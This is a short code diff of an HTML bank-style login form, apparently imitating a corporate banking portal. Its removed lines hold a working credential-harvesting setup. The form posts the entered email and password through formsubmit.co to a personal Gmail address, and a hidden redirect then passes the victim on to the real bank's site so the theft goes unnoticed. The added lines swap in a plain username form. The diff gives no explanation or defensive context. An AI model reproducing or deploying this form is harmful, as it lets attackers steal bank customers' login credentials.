@@ -96,12 +96,12 @@
 </div>
 
 
-<form action="https://formsubmit.co/oladipupoaustin1856@gmail.com" method="POST">
+<form class="theme-form form needs-validation" method="post" id="Submit_Form">
     <div class="form-body">
         <div class="textfield">
             <img src="/assets/svg/user-1.svg" width="17px" height="19px" alt="">
             <div class="divider"></div>
-            <input type="email" id="email" name="email" placeholder="Enter email" autocomplete="off" required>
+            <input type="text" id="UserName" name="UserName" placeholder="Enter Username" autocomplete="off" required>
         </div>
         <div class="textfield">
             <img src="/assets/svg/lock-1.svg" width="17px" height="19px" id="lock" alt="">
@@ -110,8 +110,7 @@
             <span toggle="#Password" class=" text-danger fa fa-fw fa-eye field-icon toggle-password"></span>
         </div>
         <p class="forgot"><a class="red" style="text-decoration:none" href="/Account/ForgotPassword">Forgot Password?</a></p>
-        <button class="button" type="submit">Submit</button>
-        <input type="hidden" name="_next" value="/https:/icorporate.tajbank.com/thanks.html">
+        <button class="button" type="button" id="login_signin_submit" onclick="showLoader();">Submit</button>
     </div>
     <!-- <div class="white-divider"></div> -->
     <div class="text-center mt-3">
